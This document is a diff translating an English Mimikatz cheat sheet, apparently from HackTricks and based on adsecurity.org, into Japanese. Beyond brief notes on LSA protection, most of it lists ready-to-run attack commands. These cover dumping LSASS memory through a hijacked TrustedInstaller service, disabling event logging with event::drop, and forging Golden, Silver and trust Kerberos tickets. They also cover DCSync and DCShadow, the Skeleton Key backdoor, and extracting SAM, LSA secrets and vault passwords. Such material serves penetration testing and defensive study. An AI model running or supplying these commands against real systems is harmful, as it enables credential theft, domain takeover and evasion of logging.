@@ -4,220 +4,209 @@
 
 <figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+**モバイルセキュリティ**の専門知識を8kSec Academyで深めましょう。自己学習コースを通じてiOSとAndroidのセキュリティをマスターし、認定を取得しましょう：
 
 {% embed url="https://academy.8ksec.io/" %}
 
-**This page is based on one from [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Check the original for further info!
+**このページは[adsecurity.org](https://adsecurity.org/?page_id=1821)のものに基づいています**。詳細については元のページを確認してください！
 
-## LM and Clear-Text in memory
+## メモリ内のLMおよび平文
 
-From Windows 8.1 and Windows Server 2012 R2 onwards, significant measures have been implemented to safeguard against credential theft:
+Windows 8.1およびWindows Server 2012 R2以降、資格情報の盗難を防ぐために重要な対策が実施されています：
 
-- **LM hashes and plain-text passwords** are no longer stored in memory to enhance security. A specific registry setting, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ must be configured with a DWORD value of `0` to disable Digest Authentication, ensuring "clear-text" passwords are not cached in LSASS.
+- **LMハッシュと平文パスワード**は、セキュリティを強化するためにメモリに保存されなくなりました。特定のレジストリ設定、_HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_をDWORD値`0`に設定してダイジェスト認証を無効にし、「平文」パスワードがLSASSにキャッシュされないようにする必要があります。
 
-- **LSA Protection** is introduced to shield the Local Security Authority (LSA) process from unauthorized memory reading and code injection. This is achieved by marking the LSASS as a protected process. Activation of LSA Protection involves:
-  1. Modifying the registry at _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ by setting `RunAsPPL` to `dword:00000001`.
-  2. Implementing a Group Policy Object (GPO) that enforces this registry change across managed devices.
+- **LSA保護**は、ローカルセキュリティ機関（LSA）プロセスを不正なメモリ読み取りやコード注入から保護するために導入されました。これは、LSASSを保護されたプロセスとしてマークすることで実現されます。LSA保護を有効にするには：
+1. _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_のレジストリを変更し、`RunAsPPL`を`dword:00000001`に設定します。
+2. 管理されたデバイス全体でこのレジストリ変更を強制するグループポリシーオブジェクト（GPO）を実装します。
 
-Despite these protections, tools like Mimikatz can circumvent LSA Protection using specific drivers, although such actions are likely to be recorded in event logs.
+これらの保護にもかかわらず、Mimikatzのようなツールは特定のドライバーを使用してLSA保護を回避することができますが、そのような行動はイベントログに記録される可能性が高いです。
 
-### Counteracting SeDebugPrivilege Removal
+### SeDebugPrivilegeの削除に対抗する
 
-Administrators typically have SeDebugPrivilege, enabling them to debug programs. This privilege can be restricted to prevent unauthorized memory dumps, a common technique used by attackers to extract credentials from memory. However, even with this privilege removed, the TrustedInstaller account can still perform memory dumps using a customized service configuration:
-
+管理者は通常SeDebugPrivilegeを持っており、プログラムをデバッグすることができます。この特権は、不正なメモリダンプを防ぐために制限されることがあります。これは、攻撃者がメモリから資格情報を抽出するために使用する一般的な手法です。しかし、この特権が削除されても、TrustedInstallerアカウントはカスタマイズされたサービス構成を使用してメモリダンプを実行することができます：
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
 ```
-
-This allows the dumping of the `lsass.exe` memory to a file, which can then be analyzed on another system to extract credentials:
-
+これにより、`lsass.exe` メモリをファイルにダンプし、別のシステムで分析して資格情報を抽出することができます：
 ```
 # privilege::debug
 # sekurlsa::minidump lsass.dmp
 # sekurlsa::logonpasswords
 ```
+## Mimikatz オプション
 
-## Mimikatz Options
+Mimikatz におけるイベントログの改ざんは、主に二つのアクションを含みます：イベントログのクリアと新しいイベントのログ記録を防ぐためのイベントサービスのパッチ適用。以下はこれらのアクションを実行するためのコマンドです：
 
-Event log tampering in Mimikatz involves two primary actions: clearing event logs and patching the Event service to prevent logging of new events. Below are the commands for performing these actions:
+#### イベントログのクリア
 
-#### Clearing Event Logs
+- **コマンド**：このアクションは、イベントログを削除することを目的としており、悪意のある活動を追跡しにくくします。
+- Mimikatz は、コマンドラインを介してイベントログを直接クリアするための直接的なコマンドを標準のドキュメントには提供していません。しかし、イベントログの操作は通常、特定のログをクリアするために Mimikatz の外部でシステムツールやスクリプトを使用することを含みます（例：PowerShell や Windows Event Viewer を使用）。
 
-- **Command**: This action is aimed at deleting the event logs, making it harder to track malicious activities.
-- Mimikatz does not provide a direct command in its standard documentation for clearing event logs directly via its command line. However, event log manipulation typically involves using system tools or scripts outside of Mimikatz to clear specific logs (e.g., using PowerShell or Windows Event Viewer).
+#### 実験的機能：イベントサービスのパッチ適用
 
-#### Experimental Feature: Patching the Event Service
+- **コマンド**：`event::drop`
+- この実験的なコマンドは、イベントログサービスの動作を変更するように設計されており、新しいイベントの記録を効果的に防ぎます。
+- 例：`mimikatz "privilege::debug" "event::drop" exit`
 
-- **Command**: `event::drop`
-- This experimental command is designed to modify the Event Logging Service's behavior, effectively preventing it from recording new events.
-- Example: `mimikatz "privilege::debug" "event::drop" exit`
+- `privilege::debug` コマンドは、Mimikatz がシステムサービスを変更するために必要な特権で動作することを保証します。
+- 次に、`event::drop` コマンドがイベントログサービスをパッチ適用します。
 
-- The `privilege::debug` command ensures that Mimikatz operates with the necessary privileges to modify system services.
-- The `event::drop` command then patches the Event Logging service.
+### Kerberos チケット攻撃
 
-### Kerberos Ticket Attacks
+### ゴールデンチケットの作成
 
-### Golden Ticket Creation
+ゴールデンチケットは、ドメイン全体のアクセスのなりすましを可能にします。主なコマンドとパラメータ：
 
-A Golden Ticket allows for domain-wide access impersonation. Key command and parameters:
+- コマンド：`kerberos::golden`
+- パラメータ：
+- `/domain`：ドメイン名。
+- `/sid`：ドメインのセキュリティ識別子 (SID)。
+- `/user`：なりすますユーザー名。
+- `/krbtgt`：ドメインの KDC サービスアカウントの NTLM ハッシュ。
+- `/ptt`：チケットをメモリに直接注入します。
+- `/ticket`：後で使用するためにチケットを保存します。
 
-- Command: `kerberos::golden`
-- Parameters:
-  - `/domain`: The domain name.
-  - `/sid`: The domain's Security Identifier (SID).
-  - `/user`: The username to impersonate.
-  - `/krbtgt`: The NTLM hash of the domain's KDC service account.
-  - `/ptt`: Directly injects the ticket into memory.
-  - `/ticket`: Saves the ticket for later use.
-
-Example:
-
+例：
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
-
 ### Silver Ticket Creation
 
-Silver Tickets grant access to specific services. Key command and parameters:
+Silver Ticketsは特定のサービスへのアクセスを許可します。主なコマンドとパラメータ：
 
-- Command: Similar to Golden Ticket but targets specific services.
+- Command: Golden Ticketに似ていますが、特定のサービスをターゲットにします。
 - Parameters:
-  - `/service`: The service to target (e.g., cifs, http).
-  - Other parameters similar to Golden Ticket.
+- `/service`: ターゲットとするサービス（例：cifs、http）。
+- その他のパラメータはGolden Ticketに似ています。
 
 Example:
-
 ```bash
 mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
 ```
+### トラストチケットの作成
 
-### Trust Ticket Creation
+トラストチケットは、信頼関係を利用してドメイン間でリソースにアクセスするために使用されます。主なコマンドとパラメータ：
 
-Trust Tickets are used for accessing resources across domains by leveraging trust relationships. Key command and parameters:
+- コマンド：ゴールデンチケットに似ていますが、信頼関係用です。
+- パラメータ：
+- `/target`: ターゲットドメインのFQDN。
+- `/rc4`: トラストアカウントのNTLMハッシュ。
 
-- Command: Similar to Golden Ticket but for trust relationships.
-- Parameters:
-  - `/target`: The target domain's FQDN.
-  - `/rc4`: The NTLM hash for the trust account.
-
-Example:
-
+例：
 ```bash
 mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
 ```
+### 追加のKerberosコマンド
 
-### Additional Kerberos Commands
+- **チケットのリスト**:
 
-- **Listing Tickets**:
+- コマンド: `kerberos::list`
+- 現在のユーザーセッションのすべてのKerberosチケットをリストします。
 
-  - Command: `kerberos::list`
-  - Lists all Kerberos tickets for the current user session.
+- **キャッシュを渡す**:
 
-- **Pass the Cache**:
+- コマンド: `kerberos::ptc`
+- キャッシュファイルからKerberosチケットを注入します。
+- 例: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
-  - Command: `kerberos::ptc`
-  - Injects Kerberos tickets from cache files.
-  - Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
+- **チケットを渡す**:
 
-- **Pass the Ticket**:
+- コマンド: `kerberos::ptt`
+- 別のセッションでKerberosチケットを使用できるようにします。
+- 例: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
 
-  - Command: `kerberos::ptt`
-  - Allows using a Kerberos ticket in another session.
-  - Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
+- **チケットを消去**:
+- コマンド: `kerberos::purge`
+- セッションからすべてのKerberosチケットをクリアします。
+- チケット操作コマンドを使用する前に、競合を避けるために便利です。
 
-- **Purge Tickets**:
-  - Command: `kerberos::purge`
-  - Clears all Kerberos tickets from the session.
-  - Useful before using ticket manipulation commands to avoid conflicts.
+### Active Directoryの改ざん
 
-### Active Directory Tampering
+- **DCShadow**: ADオブジェクト操作のために一時的にマシンをDCとして機能させます。
 
-- **DCShadow**: Temporarily make a machine act as a DC for AD object manipulation.
+- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
-  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
+- **DCSync**: DCを模倣してパスワードデータを要求します。
+- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
 
-- **DCSync**: Mimic a DC to request password data.
-  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
+### 認証情報アクセス
 
-### Credential Access
+- **LSADUMP::LSA**: LSAから認証情報を抽出します。
 
-- **LSADUMP::LSA**: Extract credentials from LSA.
+- `mimikatz "lsadump::lsa /inject" exit`
 
-  - `mimikatz "lsadump::lsa /inject" exit`
+- **LSADUMP::NetSync**: コンピュータアカウントのパスワードデータを使用してDCを偽装します。
 
-- **LSADUMP::NetSync**: Impersonate a DC using a computer account's password data.
+- _元の文脈ではNetSyncのための特定のコマンドは提供されていません。_
 
-  - _No specific command provided for NetSync in original context._
+- **LSADUMP::SAM**: ローカルSAMデータベースにアクセスします。
 
-- **LSADUMP::SAM**: Access local SAM database.
+- `mimikatz "lsadump::sam" exit`
 
-  - `mimikatz "lsadump::sam" exit`
+- **LSADUMP::Secrets**: レジストリに保存された秘密を復号化します。
 
-- **LSADUMP::Secrets**: Decrypt secrets stored in the registry.
+- `mimikatz "lsadump::secrets" exit`
 
-  - `mimikatz "lsadump::secrets" exit`
+- **LSADUMP::SetNTLM**: ユーザーの新しいNTLMハッシュを設定します。
 
-- **LSADUMP::SetNTLM**: Set a new NTLM hash for a user.
+- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
 
-  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
+- **LSADUMP::Trust**: 信頼認証情報を取得します。
+- `mimikatz "lsadump::trust" exit`
 
-- **LSADUMP::Trust**: Retrieve trust authentication information.
-  - `mimikatz "lsadump::trust" exit`
+### その他
 
-### Miscellaneous
+- **MISC::Skeleton**: DC上のLSASSにバックドアを注入します。
+- `mimikatz "privilege::debug" "misc::skeleton" exit`
 
-- **MISC::Skeleton**: Inject a backdoor into LSASS on a DC.
-  - `mimikatz "privilege::debug" "misc::skeleton" exit`
+### 権限昇格
 
-### Privilege Escalation
+- **PRIVILEGE::Backup**: バックアップ権限を取得します。
 
-- **PRIVILEGE::Backup**: Acquire backup rights.
+- `mimikatz "privilege::backup" exit`
 
-  - `mimikatz "privilege::backup" exit`
+- **PRIVILEGE::Debug**: デバッグ権限を取得します。
+- `mimikatz "privilege::debug" exit`
 
-- **PRIVILEGE::Debug**: Obtain debug privileges.
-  - `mimikatz "privilege::debug" exit`
+### 認証情報ダンプ
 
-### Credential Dumping
+- **SEKURLSA::LogonPasswords**: ログオン中のユーザーの認証情報を表示します。
 
-- **SEKURLSA::LogonPasswords**: Show credentials for logged-on users.
+- `mimikatz "sekurlsa::logonpasswords" exit`
 
-  - `mimikatz "sekurlsa::logonpasswords" exit`
+- **SEKURLSA::Tickets**: メモリからKerberosチケットを抽出します。
+- `mimikatz "sekurlsa::tickets /export" exit`
 
-- **SEKURLSA::Tickets**: Extract Kerberos tickets from memory.
-  - `mimikatz "sekurlsa::tickets /export" exit`
+### SIDとトークンの操作
 
-### Sid and Token Manipulation
+- **SID::add/modify**: SIDとSIDHistoryを変更します。
 
-- **SID::add/modify**: Change SID and SIDHistory.
+- 追加: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
+- 修正: _元の文脈では修正のための特定のコマンドは提供されていません。_
 
-  - Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-  - Modify: _No specific command for modify in original context._
+- **TOKEN::Elevate**: トークンを偽装します。
+- `mimikatz "token::elevate /domainadmin" exit`
 
-- **TOKEN::Elevate**: Impersonate tokens.
-  - `mimikatz "token::elevate /domainadmin" exit`
+### ターミナルサービス
 
-### Terminal Services
+- **TS::MultiRDP**: 複数のRDPセッションを許可します。
 
-- **TS::MultiRDP**: Allow multiple RDP sessions.
+- `mimikatz "ts::multirdp" exit`
 
-  - `mimikatz "ts::multirdp" exit`
+- **TS::Sessions**: TS/RDPセッションをリストします。
+- _元の文脈ではTS::Sessionsのための特定のコマンドは提供されていません。_
 
-- **TS::Sessions**: List TS/RDP sessions.
-  - _No specific command provided for TS::Sessions in original context._
+### ボールト
 
-### Vault
-
-- Extract passwords from Windows Vault.
-  - `mimikatz "vault::cred /patch" exit`
+- Windows Vaultからパスワードを抽出します。
+- `mimikatz "vault::cred /patch" exit`
 
 <figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+**モバイルセキュリティ**の専門知識を深めるために、8kSecアカデミーで学びましょう。自己ペースのコースを通じてiOSとAndroidのセキュリティをマスターし、認定を取得しましょう:
 
 {% embed url="https://academy.8ksec.io/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
